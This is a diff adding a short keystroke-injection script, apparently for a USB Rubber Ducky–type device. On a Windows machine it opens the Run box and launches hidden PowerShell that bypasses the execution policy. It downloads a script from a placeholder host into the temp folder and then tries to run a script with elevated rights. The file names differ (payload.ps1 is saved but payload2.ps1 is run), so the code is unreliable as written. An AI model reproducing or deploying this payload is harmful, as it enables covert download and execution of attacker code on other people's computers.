@@ -1,0 +1,6 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command \"(New-Object Net.WebClient).DownloadFile(\`"YOUROWNHOSTTO.ps1\`", \`"$env:temp\payload.ps1\`"); Start-Process powershell -ArgumentList \`"-ExecutionPolicy Bypass -File $env:temp\payload2.ps1\`" -Verb RunAs\"'"
+DELAY 1000
+ENTER
